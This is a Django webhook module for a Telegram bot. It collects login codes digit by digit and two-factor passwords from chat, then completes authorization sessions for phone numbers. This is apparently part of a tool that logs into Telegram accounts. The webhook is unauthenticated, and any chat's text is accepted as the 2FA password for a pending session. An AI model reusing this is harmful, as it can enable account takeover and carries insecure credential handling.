# accounts/telegram_webhook.py
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import json
from .models import AuthorizationSession
from .services import sync_complete_authorization, sync_complete_2fa
from .telegram_bot_service import TelegramBotService


@csrf_exempt
def telegram_webhook(request):
    """
    Webhook для обработки callback от Telegram бота
    """
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            callback_query = data.get('callback_query', {})
            message = data.get('message', {})

            # Обрабатываем callback от инлайн-клавиатуры
            if callback_query:
                return handle_callback_query(callback_query)

            # Обрабатываем текстовые сообщения (для 2FA)
            elif message and message.get('text'):
                return handle_text_message(message)

        except Exception as e:
            return JsonResponse({'status': 'error', 'error': str(e)})

    return JsonResponse({'status': 'ok'})


def handle_callback_query(callback_query):
    """Обработка callback от инлайн-клавиатуры"""
    callback_data = callback_query.get('data', '')
    chat_id = callback_query['message']['chat']['id']
    message_id = callback_query['message']['message_id']

    # Парсим callback_data: code_1_79123456789
    parts = callback_data.split('_')

    if len(parts) >= 3 and parts[0] == 'code':
        action = parts[1]
        phone_number = parts[2]

        # Находим активную сессию авторизации
        try:
            auth_session = AuthorizationSession.objects.get(
                phone_number=phone_number,
                status__in=['WAITING_CODE', 'NEED_2FA']
            )

            bot_service = TelegramBotService(auth_session.bot.bot_token)

            if action == 'delete':
                # Удаляем последнюю цифру
                if auth_session.code:
                    auth_session.code = auth_session.code[:-1]
                    auth_session.save()

                bot_service.update_code_message(
                    chat_id, message_id, phone_number, auth_session.code
                )

            elif action == 'submit':
                # Отправляем код на проверку
                if len(auth_session.code) >= 5:
                    result = sync_complete_authorization(
                        auth_session.id, auth_session.code
                    )

                    if result['success']:
                        bot_service.delete_message(chat_id, message_id)
                        bot_service.send_success_message(chat_id, phone_number)
                    else:
                        if result.get('need_2fa'):
                            bot_service.delete_message(chat_id, message_id)
                            bot_service.send_message(
                                chat_id,
                                f"🔐 <b>Требуется 2FA для {phone_number}</b>\n\n"
                                f"Отправьте пароль двухфакторной аутентификации:"
                            )
                        else:
                            bot_service.send_error_message(
                                chat_id, phone_number, result['error']
                            )
                else:
                    bot_service.send_message(
                        chat_id,
                        "❌ Код должен содержать 5 цифр"
                    )

            elif action.isdigit():
                # Добавляем цифру к коду
                if len(auth_session.code) < 5:
                    auth_session.code += action
                    auth_session.save()

                    # Если код заполнен, автоматически отправляем
                    if len(auth_session.code) == 5:
                        result = sync_complete_authorization(
                            auth_session.id, auth_session.code
                        )

                        if result['success']:
                            bot_service.delete_message(chat_id, message_id)
                            bot_service.send_success_message(chat_id, phone_number)
                        else:
                            if result.get('need_2fa'):
                                bot_service.delete_message(chat_id, message_id)
                                bot_service.send_message(
                                    chat_id,
                                    f"🔐 <b>Требуется 2FA для {phone_number}</b>\n\n"
                                    f"Отправьте пароль двухфакторной аутентификации:"
                                )
                            else:
                                bot_service.update_code_message(
                                    chat_id, message_id, phone_number, auth_session.code
                                )
                                bot_service.send_message(
                                    chat_id,
                                    f"❌ Ошибка: {result['error']}\n\nПопробуйте снова:"
                                )
                    else:
                        # Обновляем сообщение с текущим кодом
                        bot_service.update_code_message(
                            chat_id, message_id, phone_number, auth_session.code
                        )

        except AuthorizationSession.DoesNotExist:
            # Если сессия не найдена, используем первый доступный бот для отправки сообщения
            try:
                from .models import UserBot
                user_bot = UserBot.objects.first()
                if user_bot:
                    bot_service = TelegramBotService(user_bot.bot_token)
                    bot_service.send_message(
                        chat_id,
                        "❌ Сессия авторизации не найдена или истекла"
                    )
            except:
                pass

    return JsonResponse({'status': 'ok'})


def handle_text_message(message):
    """Обработка текстовых сообщений (для 2FA)"""
    chat_id = message['chat']['id']
    text = message['text']

    # Ищем сессию, требующую 2FA
    try:
        auth_session = AuthorizationSession.objects.get(
            status='NEED_2FA'
        )

        bot_service = TelegramBotService(auth_session.bot.bot_token)

        # Пытаемся завершить авторизацию с 2FA паролем
        result = sync_complete_2fa(auth_session.id, text)

        if result['success']:
            bot_service.send_success_message(chat_id, auth_session.phone_number)
        else:
            bot_service.send_error_message(
                chat_id, auth_session.phone_number, result['error']
            )

    except AuthorizationSession.DoesNotExist:
        pass

    return JsonResponse({'status': 'ok'})